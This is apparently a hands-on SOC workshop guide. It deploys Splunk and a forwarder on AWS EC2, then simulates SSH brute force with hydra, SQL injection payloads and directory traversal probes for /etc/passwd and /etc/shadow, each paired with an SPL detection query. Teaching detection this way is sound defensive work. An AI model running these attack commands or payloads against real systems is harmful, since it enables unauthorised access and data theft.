Installing Splunk Enterprise on AWS EC2

We will provision an EC2 instance through AWS Academy Learner Lab and run a single automated script that downloads, installs, and configures Splunk Enterprise. By the end of this section, your Splunk web interface will be accessible from a browser.

Step 1

Start your AWS Academy Learner Lab session

Log in to your AWS Academy course, open the Learner Lab, and click Start Lab. Wait until the indicator turns green, then click AWS to open the console. Your session will remain active for the duration of the lab.

ℹ
Session timeLearner Lab sessions typically last 4 hours. Do not close your browser tab — the session timer continues regardless. If your session expires, all resources will be terminated and you will need to start over.
Step 2

Launch an EC2 instance

Navigate to EC2 → Launch Instance and configure the following settings exactly as listed:

SettingValue
Namesplunk-server
AMIUbuntu Server 22.04 LTS (HVM), SSD Volume Type
Instance typet2.large (2 vCPU, 8 GiB RAM — minimum for Splunk)
Key pairvockey (provided by Learner Lab)
Storage30 GiB gp3

Under Network Settings → Security Group, add these inbound rules:

Step 3

Connect via SSH

Once the instance reaches Running state, connect using the key pair downloaded from the Learner Lab panel (labsuser.pem).

bash
# Set correct permissions on the key file
chmod 400 ~/Downloads/labsuser.pem

# Connect — replace with your EC2 public IPv4 address
ssh -i ~/Downloads/labsuser.pem ubuntu@<PUBLIC-IP>
Step 4

Run the automated Splunk installation script

Copy the entire script below, paste it into your SSH session, and press Enter. The script handles the full installation — download, configuration, index creation, and firewall rules. It takes approximately 3–5 minutes to complete.

bash — splunk-install.sh
#!/bin/bash
# ============================================================
#  Splunk Enterprise Automated Workshop Setup
#  Tested on: Ubuntu 22.04 LTS | AWS EC2 t2.large
# ============================================================
set -euo pipefail

SPLUNK_VERSION="9.2.1"
SPLUNK_BUILD="78803f08aabb"
SPLUNK_HOME="/opt/splunk"
ADMIN_PASS="Workshop2026!"
PKG="splunk-${SPLUNK_VERSION}-${SPLUNK_BUILD}-linux-2.6-amd64.deb"
URL="https://download.splunk.com/products/splunk/releases/${SPLUNK_VERSION}/linux/${PKG}"

echo "[1/6] Updating system packages..."
sudo apt-get update -qq
sudo apt-get install -y wget curl ufw net-tools

echo "[2/6] Downloading Splunk Enterprise ${SPLUNK_VERSION}..."
wget -q --show-progress "${URL}" -O /tmp/"${PKG}"

echo "[3/6] Installing Splunk..."
sudo dpkg -i /tmp/"${PKG}"

echo "[4/6] Starting Splunk and accepting license..."
sudo "${SPLUNK_HOME}"/bin/splunk start \
  --accept-license --answer-yes --no-prompt \
  --seed-passwd "${ADMIN_PASS}"

sudo "${SPLUNK_HOME}"/bin/splunk enable boot-start -user splunk

echo "[5/6] Configuring forwarder receiver and creating indexes..."
sudo -u splunk "${SPLUNK_HOME}"/bin/splunk enable listen 9997 \
  -auth admin:"${ADMIN_PASS}"

sudo -u splunk "${SPLUNK_HOME}"/bin/splunk add index webserver_logs \
  -auth admin:"${ADMIN_PASS}"

sudo -u splunk "${SPLUNK_HOME}"/bin/splunk add index security_logs \
  -auth admin:"${ADMIN_PASS}"

echo "[6/6] Configuring firewall rules..."
sudo ufw allow 22/tcp
sudo ufw allow 8000/tcp
sudo ufw allow 9997/tcp
sudo ufw allow 8089/tcp
sudo ufw --force enable

PUBLIC_IP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)

echo ""
echo "============================================="
echo "  Installation complete."
echo "  Splunk Web:  http://${PUBLIC_IP}:8000"
echo "  Username:    admin"
echo "  Password:    ${ADMIN_PASS}"
echo "  Forwarder:   Port 9997 is open and listening"
echo "============================================="

Deploying the Universal Forwarder and Web Server

The Universal Forwarder (UF) is a lightweight agent that collects logs from a source machine and ships them to your Splunk indexer. You will launch a second EC2 instance, install Apache as a web server, and configure the UF to forward Apache and authentication logs back to the Splunk instance from Section 1.

Step 1

Launch a second EC2 instance

Return to the EC2 console and launch a new instance. A t2.micro is sufficient — this machine generates logs, it does not index them.

SettingValue
Namewebserver-forwarder
AMIUbuntu Server 22.04 LTS
Instance typet2.micro
Key pairvockey
Security group ports22 (SSH), 80 (HTTP), 443 (HTTPS)

Note both the public IP (for SSH and browser access) and the private IP (for the forwarder connection within the VPC).

Step 2

Install Apache and the demo web application

SSH into the second instance and run the following script:

bash — webserver-setup.sh
#!/bin/bash
# Run this on the FORWARDER / WEB SERVER instance
sudo apt-get update -qq
sudo apt-get install -y apache2 php libapache2-mod-php

# Deploy a simple PHP login page to generate HTTP access logs
sudo tee /var/www/html/login.php << 'EOF'
<?php
$user = $_GET['user'] ?? '';
$pass = $_GET['pass'] ?? '';
if ($user && $pass) {
    error_log("Login attempt: user=$user");
}
echo "<h2>Workshop Demo Login</h2>";
echo "<p>User: " . htmlspecialchars($user) . "</p>";
EOF

# Create directories for traversal demonstration
sudo mkdir -p /var/www/html/admin /var/www/html/backup
echo "Restricted area" | sudo tee /var/www/html/admin/config.txt

sudo systemctl enable apache2
sudo systemctl restart apache2

echo "Web server: http://$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)"
Step 3

Install and configure the Universal Forwarder

Still on the second (web server) instance, run the script below. Replace INDEXER_IP with the private IP of your Splunk EC2 instance.

bash — forwarder-install.sh
#!/bin/bash
# Replace with your Splunk indexer's PRIVATE IP address
INDEXER_IP="<SPLUNK-PRIVATE-IP>"

UF_VERSION="9.2.1"
UF_BUILD="78803f08aabb"
UF_PKG="splunkforwarder-${UF_VERSION}-${UF_BUILD}-linux-2.6-amd64.deb"
UF_URL="https://download.splunk.com/products/universalforwarder/releases/${UF_VERSION}/linux/${UF_PKG}"
UF_PASS="Forwarder2026!"

echo "[1/4] Downloading Universal Forwarder..."
wget -q --show-progress "${UF_URL}" -O /tmp/"${UF_PKG}"
sudo dpkg -i /tmp/"${UF_PKG}"

echo "[2/4] Starting forwarder..."
sudo /opt/splunkforwarder/bin/splunk start \
  --accept-license --answer-yes --no-prompt \
  --seed-passwd "${UF_PASS}"

echo "[3/4] Configuring forwarding destination..."
sudo /opt/splunkforwarder/bin/splunk add forward-server \
  "${INDEXER_IP}:9997" -auth admin:"${UF_PASS}"

echo "[4/4] Adding log monitors..."

sudo /opt/splunkforwarder/bin/splunk add monitor \
  /var/log/apache2/access.log \
  -index webserver_logs -sourcetype apache_access \
  -auth admin:"${UF_PASS}"

sudo /opt/splunkforwarder/bin/splunk add monitor \
  /var/log/apache2/error.log \
  -index webserver_logs -sourcetype apache_error \
  -auth admin:"${UF_PASS}"

sudo /opt/splunkforwarder/bin/splunk add monitor \
  /var/log/auth.log \
  -index security_logs -sourcetype linux_secure \
  -auth admin:"${UF_PASS}"

sudo /opt/splunkforwarder/bin/splunk enable boot-start

echo "Forwarder active — sending logs to ${INDEXER_IP}:9997"
✓
Verify in SplunkIn Splunk Web, go to Settings → Forwarder Management. Your web server should appear as a connected client within 60 seconds. Run index=webserver_logs | head 5 in the Search bar to confirm logs are arriving.
03

Splunk Architecture Overview

Before running searches, it is worth understanding how the components you have just deployed relate to one another. Splunk's architecture separates the roles of data collection, indexing, and searching — a design that scales from a single server to thousands of nodes in an enterprise deployment.

Data Sources
Apache access logs · auth.log · syslog
Generated continuously on the web server EC2 instance
↓   Collected by agent on the same host
Universal Forwarder
Lightweight agent — EC2 Instance #2
Tails log files, compresses, and transmits over TCP/9997
↓   Encrypted stream over private VPC network
Indexer
Splunk Enterprise — EC2 Instance #1
Parses, timestamps, and stores events in compressed index buckets
↓   SPL queries issued through the same process
Search Head
Splunk Web — port 8000
Dashboard, alerts, SPL editor — accessed from your browser

In this workshop, the Indexer and Search Head are co-located on the same EC2 instance — known as a standalone deployment, appropriate for labs and small environments. Production deployments separate these roles across dedicated hardware.

SPL Fundamentals

Search Processing Language (SPL) follows a pipeline model — each command receives the output of the previous command, separated by a pipe character. Run the queries below in order as an orientation before the attack demonstrations. In Splunk Web, click Search & Reporting and set the time range to Last 15 minutes.

Query 1

Confirm data is arriving

SPL
index=webserver_logs | head 20

You should see the 20 most recent events from your Apache web server. Each event represents one HTTP request.

Query 2

Count events over time

SPL
index=webserver_logs | timechart span=1m count
Query 3

Summarise HTTP status codes

SPL
index=webserver_logs sourcetype=apache_access
| stats count by status
| sort -count
| rename status as "HTTP Status", count as "Requests"
Query 4

Extract fields with rex

The rex command extracts fields from raw text using named capture groups. This is essential for working with logs Splunk has not automatically parsed.

SPL
index=security_logs sourcetype=linux_secure
| rex field=_raw "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by src_ip
| sort -count
Reference

Core SPL command reference

CommandWhat it doesCommon use

statsCompute statistics (count, sum, avg, dc)stats count by src_ip

05

Attack Demonstrations and Detection

The following three demonstrations simulate common attack patterns encountered in SOC environments. Each attack is run first, then the corresponding SPL detection query is executed in Splunk to locate the evidence — mirroring real incident investigation workflow.

⚠
Authorised use onlyThese attack commands must only be executed against the web server instance you created in this lab, within your own AWS Academy Learner Lab environment. Running these commands against any system you do not own is illegal. This lab exists solely for educational demonstration.
Attack 1

SSH Brute Force

A brute force attack tries many passwords systematically against an authentication service. We use hydra to simulate credential stuffing against the web server's SSH port. Failed attempts appear in /var/log/auth.log and flow into Splunk via the forwarder.

Run the following from your Splunk EC2 instance — not the web server itself.

bash — run from the Splunk instance
# Install hydra
sudo apt-get install -y hydra

# Create a password wordlist
cat > /tmp/wordlist.txt << EOF
password
123456
admin
letmein
workshop
qwerty
splunk
ubuntu
EOF

# Run the brute force — replace with your web server's public IP
hydra -l ubuntu -P /tmp/wordlist.txt \
  ssh://<WEB-SERVER-IP> \
  -t 4 -vV 2>&1 | tail -30

Now switch to Splunk Web and run this detection query:

SPL — Detect SSH Brute Force
index=security_logs sourcetype=linux_secure "Failed password"
| rex field=_raw "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"
| rex field=_raw "for (?:invalid user )?(?P<username>\w+)"
| stats
    count            as attempts
    dc(username)      as usernames_tried
    earliest(_time)  as first_seen
    latest(_time)    as last_seen
    by src_ip
| where attempts > 3
| eval duration_sec = last_seen - first_seen
| eval severity = case(
    attempts > 50, "CRITICAL",
    attempts > 20, "HIGH",
    attempts > 5,  "MEDIUM",
    true(),          "LOW")
| sort -attempts
| table src_ip, attempts, usernames_tried, severity, duration_sec
Attack 2

SQL Injection

SQL injection attempts to insert malicious SQL syntax into application parameters. Even when an application rejects the input, the attempt is logged in the web server access log. The query string is visible in /var/log/apache2/access.log.

bash — simulate SQL injection probes
TARGET="http://<WEB-SERVER-IP>"

payloads=(
  "' OR '1'='1"
  "' OR 1=1--"
  "' UNION SELECT NULL,NULL--"
  "admin'--"
  "1; DROP TABLE users--"
  "' AND SLEEP(5)--"
  "' OR 'x'='x"
)

for payload in "${payloads[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "${payload}")
  http_code=$(curl -s -o /dev/null -w "%{http_code}" \
    "${TARGET}/login.php?user=${encoded}&pass=test")
  echo "HTTP ${http_code}  →  ${payload}"
  sleep 0.5
done
SPL — Detect SQL Injection
index=webserver_logs sourcetype=apache_access
| eval decoded_uri = urldecode(uri_query)
| where match(decoded_uri,
    "(?i)(union\s+select|or\s+1=1|drop\s+table|sleep\(|'--)")
| stats
    count             as injection_attempts
    values(decoded_uri) as payloads_used
    dc(uri_path)       as endpoints_probed
    by clientip
| sort -injection_attempts
Attack 3

Directory Traversal

A directory traversal attack attempts to read files outside the web root by manipulating path segments with encoded variants to bypass input filters. These appear in the Apache access log as unusual URI patterns.

bash — directory traversal probes
TARGET="http://<WEB-SERVER-IP>"

traversal_paths=(
  "../../../../etc/passwd"
  "../../../etc/shadow"
  "..%2F..%2F..%2Fetc%2Fpasswd"
  "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "....//....//etc/passwd"
  "/admin/../../../etc/passwd"
)

for path in "${traversal_paths[@]}"; do
  http_code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/${path}")
  echo "HTTP ${http_code}  →  ${path}"
  sleep 0.3
done
SPL — Detect Directory Traversal
index=webserver_logs sourcetype=apache_access
| eval decoded = urldecode(uri)
| where match(decoded, "\.\.[\\/]")
    OR match(uri, "%2e%2e|%252e|\.\.%2[Ff]")
| stats
    count           as traversal_attempts
    values(uri)    as paths_tried
    values(status) as http_responses
    by clientip
| eval risk_score = traversal_attempts * 10
| sort -traversal_attempts

Incident Response Workflow

Detection is only the first step. A mature SOC follows a structured process to investigate, contain, and document security incidents. The following shows how a brute force detection in Splunk progresses through a real incident response lifecycle.

PhaseSOC ActionSplunk Role
1. DetectionScheduled alert fires — 10+ failed SSH attempts from a single IP in 5 minutesAlert configured in Settings → Alerts using the brute force SPL query
2. TriageAnalyst reviews alert, confirms the IP is not an internal scanner, assesses severityDashboard panel showing top attacker IPs and geolocation if available
3. InvestigationDetermine scope — did any attempt succeed? What accounts were targeted?SPL: search for "Accepted password" from the same src_ip
4. ContainmentBlock the attacking IP at the security group level in the AWS consoleSplunk identifies the IP; containment action occurs in the AWS console
5. DocumentationLog the incident with timeline, affected systems, and actions takenExport SPL results as CSV; attach to ticket in your ITSM system
6. Post-IncidentReview alert thresholds, update firewall rules, consider fail2banDashboard used in post-incident review to replay the event timeline
SPL

Check whether a brute force succeeded

SPL — Successful Login After Failures
index=security_logs sourcetype=linux_secure
| rex field=_raw "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)"
| eval outcome = case(
    searchmatch("Failed password"),   "failure",
    searchmatch("Accepted password"), "success",
    true(), "other")
| stats
    sum(eval(outcome="failure")) as failures
    sum(eval(outcome="success")) as successes
    by src_ip
| where failures > 3 AND successes > 0
| eval alert = "POTENTIAL COMPROMISE — investigate immediately"
